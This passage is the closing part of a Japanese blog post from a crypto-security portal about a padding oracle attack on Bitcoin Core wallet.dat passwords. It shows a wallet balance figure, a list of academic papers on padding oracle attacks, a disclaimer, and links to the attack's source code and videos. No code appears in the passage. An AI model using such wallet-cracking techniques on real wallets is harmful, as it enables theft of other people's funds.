<!-- /wp:image -->

<!-- wp:image {"id":4228} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-113-1024x146.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4228"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><code>BALANCE: $ 44502.42</code></strong></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">参考文献:</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>[1]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Practical_Padding_Oracle_Attacks_Juliano_Rizzo_Thai_Duong.pdf" target="_blank" rel="noreferrer noopener">実践的なパディングオラクル攻撃<strong>(Juliano Rizzo Thai Duong) [2010]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[2]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Efficient_Padding_Oracle_Attacks_on_Cryptographic_Hardware_Romain_Bardou_Riccardo_Focardi_Yusuke_Kawamoto_Lorenzo_Simionato_Graham_Steel__Joe_Kai_Tsay.pdf" target="_blank" rel="noreferrer noopener">暗号ハードウェアに対する効率的なパディング Oracle 攻撃<strong>(Romain Bardou、Riccardo Focardi、川本祐介、Lorenzo Simionato、Graham Steel、Joe-Kai Tsay)</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[3]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Security_Flaws_Induced_by_CBC_Padding_Applications_to_SSL_IPSEC_WTLS_Serge_Vaudenay.pdf" target="_blank" rel="noreferrer noopener">SSL、IPSEC、WTLS への CBC パディング アプリケーションによって引き起こされるセキュリティ上の欠陥</a></em><strong><em><a href="https://cryptodeep.ru/doc/Security_Flaws_Induced_by_CBC_Padding_Applications_to_SSL_IPSEC_WTLS_Serge_Vaudenay.pdf" target="_blank" rel="noreferrer noopener">(Serge Vaudenay)</a></em></strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[4]&nbsp;</strong><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attack_on_PKCS_Can_Non_standard_Implementation_Act_as_a_Shelter_Si_Gao_Hua_Chen_and_Limin_Fan.pdf" target="_blank" rel="noreferrer noopener"><em>PKCS#1 v1.5 に対するパディング オラクル攻撃: 非標準実装はシェルターとして機能するか<strong>(Si Gao、Hua Chen、Limin Fan)</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[5]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Attacks_and_Defenses_Dr_Falko_Strenzke.pdf" target="_blank" rel="noreferrer noopener">攻撃と防御<strong>(ファルコ・シュトレンケ博士) [2020]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[6]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/CBC_padding_oracle_attacks.pdf" target="_blank" rel="noreferrer noopener">CBC パディングオラクル攻撃<strong>[2023]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[7]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Fun_with_Padding_Oracles_Justin_Clarke_OWASP_London_Chapter.pdf" target="_blank" rel="noreferrer noopener">パディングオラクルの楽しみ<strong>(Justin Clarke) [OWASP ロンドン支部]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[8]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Practical_Padding_Oracle_Attacks_on_RSA_Riccardo_Focardi.pdf" target="_blank" rel="noreferrer noopener">RSA に対する実践的なパディング Oracle 攻撃<strong>(Riccardo Focardi)</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[9]</strong>&nbsp;<a href="https://cryptodeep.ru/doc/The_Padding_Oracle_Attack_Fionn_Fitzmaurice_2018.pdf" target="_blank" rel="noreferrer noopener"><em>パディング・オラクル攻撃<strong>(フィオン・フィッツモーリス) [2018]</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[10]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Exploiting_CBC_Padding_Oracles_Eli_Sohl_2021.pdf" target="_blank" rel="noreferrer noopener">CBC パディング オラクルの悪用<strong>Eli Sohl [2021]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;11&nbsp;]</strong>&nbsp;<a href="https://cryptodeep.ru/doc/Partitioning_Oracle_Attacks_Julia_Len_Paul_Grubbs_Thomas_Ristenpart_Cornell_Tech.pdf" target="_blank" rel="noreferrer noopener"><em>パーティショニング Oracle 攻撃<strong>(Julia Len、Paul Grubbs、Thomas Ristenpart) [コーネル大学]</strong></em></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;12&nbsp;]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Padding_and_CBC_Mode_y_David_Wagner_and_Bruce_Schneider_1997.pdf" target="_blank" rel="noreferrer noopener">パディングと CBC モード<strong>(David Wagner と Bruce Schneider) [1997]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;13&nbsp;]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attacks_methodology.pdf" target="_blank" rel="noreferrer noopener">パディングオラクル攻撃<strong>(方法論)</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>[&nbsp;14&nbsp;]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Padding_Oracle_Attack_Introduction_Packet_Encryption_Mode_CTF_Events.pdf" target="_blank" rel="noreferrer noopener">パディング Oracle 攻撃<strong>(パケット暗号化モード CTF イベントの導入)</strong></a></em></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>この資料は、&nbsp;<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">暗号</a>通貨 BITCOIN&nbsp;の&nbsp;弱い<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>&nbsp;署名&nbsp;に対するデータおよび楕円曲線暗号<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1</a>&nbsp;の財務的セキュリティを確保するために、&nbsp;&nbsp;<a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>ポータル用に作成されました。ソフトウェアの作成者は素材の使用について責任を負いません。<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener"></a><a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener"></a><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">ソース</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">電報: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/0aCfT-kCRlw" target="_blank" rel="noreferrer noopener">動画素材：https://youtu.be/0aCfT-kCRlw</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/padding-oracle-attack-on-wallet-dat" target="_blank" rel="noreferrer noopener">出典: https://cryptodeep.ru/padding-oracle-攻撃-on-wallet-dat</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4252} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/048-1024x576.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4252"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">暗号解析</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
